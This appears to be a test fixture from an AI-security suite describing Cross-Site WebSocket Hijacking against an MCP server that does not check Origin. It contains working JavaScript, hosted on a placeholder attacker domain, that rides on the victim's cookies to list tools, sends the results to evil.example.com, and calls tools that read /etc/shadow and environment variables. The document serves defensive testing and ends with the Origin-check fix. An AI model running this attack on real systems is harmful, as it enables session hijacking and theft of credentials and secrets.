@@ -1,0 +1,79 @@
+# DojoLM AI Security - WebSocket Origin Bypass
+
+**Category:** WebMCP WebSocket Hijacking (CSWSH)
+**Severity:** CRITICAL
+
+---
+
+A Cross-Site WebSocket Hijacking attack where an attacker's page opens a WebSocket to the MCP server, exploiting missing origin validation:
+
+Attacker's page at https://evil.example.com/hijack.html:
+<script>
+// Cross-Site WebSocket Hijacking (CSWSH)
+// The victim's browser sends cookies with the WebSocket handshake
+var ws = new WebSocket('wss://mcp-api.example.com/ws/mcp');
+
+ws.onopen = function() {
+  console.log('WebSocket connected to MCP server with victim cookies');
+
+  // Enumerate available tools
+  ws.send(JSON.stringify({
+    jsonrpc: '2.0',
+    method: 'tools/list',
+    id: 1
+  }));
+};
+
+ws.onmessage = function(event) {
+  var data = JSON.parse(event.data);
+
+  // Exfiltrate tool list
+  fetch('https://evil.example.com/ws-collect', {
+    method: 'POST',
+    body: event.data
+  });
+
+  // If we got the tool list, start invoking tools
+  if (data.id === 1 && data.result) {
+    // Read sensitive files
+    ws.send(JSON.stringify({
+      jsonrpc: '2.0',
+      method: 'tools/call',
+      params: {
+        name: 'filesystem_read',
+        arguments: { path: '/etc/shadow' }
+      },
+      id: 2
+    }));
+
+    // Read environment variables
+    ws.send(JSON.stringify({
+      jsonrpc: '2.0',
+      method: 'tools/call',
+      params: {
+        name: 'env_read',
+        arguments: {}
+      },
+      id: 3
+    }));
+  }
+};
+</script>
+
+WebSocket handshake (sent by victim's browser):
+GET /ws/mcp HTTP/1.1
+Host: mcp-api.example.com
+Upgrade: websocket
+Connection: Upgrade
+Origin: https://evil.example.com
+Cookie: mcp_session=victim_authenticated_session_token
+Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
+Sec-WebSocket-Version: 13
+
+Vulnerable server response (does not check Origin):
+HTTP/1.1 101 Switching Protocols
+Upgrade: websocket
+Connection: Upgrade
+Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
+
+INSTRUCTION: This demonstrates CSWSH via missing origin validation. MCP WebSocket endpoints must validate the Origin header against a whitelist of trusted origins and reject connections from unauthorized domains.
